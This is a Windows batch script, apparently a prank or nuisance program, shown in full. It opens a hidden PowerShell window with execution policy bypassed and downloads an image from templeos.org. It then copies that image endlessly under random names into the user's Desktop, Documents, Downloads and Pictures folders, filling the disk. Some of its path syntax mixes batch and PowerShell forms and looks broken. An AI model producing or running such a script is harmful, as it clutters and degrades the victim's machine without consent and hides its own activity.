@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "curl -o %TEMP%\image.png https://templeos.org/Templeos-header.png"

:loop
powershell cp %TEMP%\image.png $env:%USERPROFILE%\Desktop\%random%image.png
powershell cp %TEMP%\image.png $env:%USERPROFILE%\Documents\%random%image.png
powershell cp %TEMP%\image.png $env:%USERPROFILE%\Downloads\%random%image.png
powershell cp %TEMP%\image.png $env:%USERPROFILE%\Pictures\%random%image.png
goto loop
